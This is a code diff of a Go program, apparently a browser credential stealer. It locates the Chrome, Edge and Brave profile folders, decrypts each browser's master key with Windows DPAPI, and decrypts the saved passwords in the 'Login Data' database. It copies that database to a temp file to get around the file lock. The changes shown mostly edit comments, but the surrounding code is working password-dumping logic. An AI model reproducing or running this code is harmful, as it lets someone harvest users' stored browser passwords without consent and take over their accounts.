@@ -43,6 +43,7 @@ func (b *DATA_BLOB) ToByteArray() []byte {
 	return d
 }
 
+// Wrapper for CryptUnprotectData
 func DecryptDPAPI(data []byte) ([]byte, error) {
 	var outBlob DATA_BLOB
 	blobIn := NewBlob(data)
@@ -84,7 +85,6 @@ func GetMasterKey(localStatePath string) ([]byte, error) {
 		return nil, fmt.Errorf("base64 decode failed: %v", err)
 	}
 
-	// Remove DPAPI prefix (DPAPI)
 	if len(encryptedKey) < 5 {
 		return nil, fmt.Errorf("key too short")
 	}
@@ -98,7 +98,6 @@ func DecryptPassword(ciphertext []byte, key []byte) (string, error) {
 		return "", fmt.Errorf("ciphertext too short")
 	}
 
-	// v10 prefix
 	nonce := ciphertext[3:15]
 	encryptedPass := ciphertext[15 : len(ciphertext)-16]
 
@@ -123,7 +122,6 @@ func DecryptPassword(ciphertext []byte, key []byte) (string, error) {
 func DumpBrowsers() string {
 	var sb strings.Builder
 
-	// Chrome
 	localAppData := os.Getenv("LOCALAPPDATA")
 	chromePath := filepath.Join(localAppData, "Google", "Chrome", "User Data")
 	if _, err := os.Stat(chromePath); err == nil {
@@ -132,7 +130,6 @@ func DumpBrowsers() string {
 		sb.WriteString("\n")
 	}
 
-	// Edge
 	edgePath := filepath.Join(localAppData, "Microsoft", "Edge", "User Data")
 	if _, err := os.Stat(edgePath); err == nil {
 		sb.WriteString("=== Microsoft Edge ===\n")
@@ -140,7 +137,6 @@ func DumpBrowsers() string {
 		sb.WriteString("\n")
 	}
 
-	// Brave
 	bravePath := filepath.Join(localAppData, "BraveSoftware", "Brave-Browser", "User Data")
 	if _, err := os.Stat(bravePath); err == nil {
 		sb.WriteString("=== Brave Browser ===\n")
@@ -164,13 +160,12 @@ func DumpBrowser(userDataPath string) string {
 		return fmt.Sprintf("Error getting master key: %v\n", err)
 	}
 
-	// We need to copy Login Data because it might be locked
 	loginData := filepath.Join(userDataPath, "Default", "Login Data")
 	if _, err := os.Stat(loginData); os.IsNotExist(err) {
-		// Try looking in other profiles? For now just Default
 		return "Login Data not found in Default profile\n"
 	}
 
+	// Copy DB to temp to bypass lock
 	tempLoginData := filepath.Join(os.TempDir(), fmt.Sprintf("LoginData_%d.db", syscall.Getpid()))
 	err = CopyFile(loginData, tempLoginData)
 	if err != nil {
